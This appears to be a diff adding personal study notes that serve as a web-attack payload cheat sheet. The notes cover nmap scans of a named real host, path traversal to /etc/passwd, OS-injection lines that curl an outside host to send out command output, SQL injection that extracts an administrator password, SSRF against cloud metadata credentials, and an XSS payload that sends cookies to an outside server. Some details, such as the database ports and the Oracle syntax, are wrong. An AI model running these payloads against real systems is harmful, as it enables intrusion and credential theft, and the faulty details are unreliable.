@@ -1,0 +1,69 @@
+wsl    for open linux in windows cmd
+wget -r url => to download it perfect.
+nmap -p- -v url =>know open ports
+nmap -v -p 21,22,66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,7777,8000,8080,8443,8888,30821 new-sentry.gitlab.net
+
+../../../../../../../etc/passwd%00.jpg
+
+
+os injection   uname   pwd 
+Blind os injection   ;sleep+5;          => to sleep+5 secound and see if this work
+
+async os injection   ;curl+https://shop-backend-tau.vercel.app/tryosInjection;          => and look server logs in vercel look if agent curl
+and you can make coomand and see result by `command` like ;curl+https://shop-backend-tau.vercel.app/`uname`;
+will be https://shop-backend-tau.vercel.app/linux
+ 
+
+(SQL) (Oracle) (Microsoft) (PostgreSQL) injection  
+1- -- mean comment 
+2- '+and+1=1--
+3- '+and+1=0--
+4- 'union+select+NULL,NULL--
+5- 'union+select+1,2--
+6- 'union+select+'a',NULL--
+7- 'union+select+version(),NULL--
+8- 'union+select+username,NULL+from+users--
+
+Blind (SQL) (Response length will be high if true :))
+2- '+anD+1=1-- //////true
+3- '+anD+1=0-- /////false
+9- '+and+(select+'a'+from+users+limit+1)='a'--   ///true or false  if we have users table true 
+10- '+and+(select+'a'+from+users+WHERE+username='administrator')='a'--   ///true or false  if we have username administrator in users table true 
+11- '+and+(select+'a'+from+users+WHERE+username='administrator'+AND+LENGTH(password)>1)='a'--
+12- '+and+(select+'a'+from+users+WHERE+username='administrator'+AND+LENGTH(password)>10)='a'--
+13- '+and+(select+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a'-- a,b,c,d,f,g,e,w,q,t,y,v,u,i,z to know the first letter in password
+14- '+and+(select+SUBSTRING(password,2,1)+FROM+users+WHERE+username='administrator')='a'-- a,b,c,d,f,g,e,w,q,t,y,v,u,i,z to know the sec letter in password
+
+Time Base (SQL)
+15- '+anD+SELECT+sleep(10)--
+16- '||sleep(10)--
+
+Time Base (PostgreSQL) 
+15- '+anD+SELECT+pg_sleep(10)--
+16- '||pg_sleep(10)--
+
+Time Base (Microsoft) 
+15- '+anD+WAITFOR+DELAY'0:0:10'--
+16- '||WAITFOR+DELAY'0:0:10'--
+
+Time Base (Oracle) 
+15- '+anD+dbms+pipe.receive_message(("a"),10)--
+16- '||dbms+pipe.receive_message(("a"),10)--
+
+you can search from cheat sheet for any thing..
+
+https port = 443 or 8080
+http port = 80
+database port = 122 or 143 or 134 or 143 or 3306 or others
+
+SSRF localhost is 
+localhost     , lOcaLHost ,   127.0.0.1   , 127.1    , 017700000001 , 0x7f000001  ,  2130706433
+url=http%3A%2F%2F169.254.169.254%2F/latest/meta-data/iam/security-credentials/ecsInstanceRole%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5
+
+
+XSS Black Hat 
+<script>document.write('<img src="https://shop-backend-tau.vercel.app/'+ document.cookie + '">');</script>
+
+
+Information Disclosure, Logic Vulnerabilities ,CSRF ,IDOR , OS Injection , XSS Injection, Database Vulnerabilities  , SQL Injection ,SSRF
+video 61
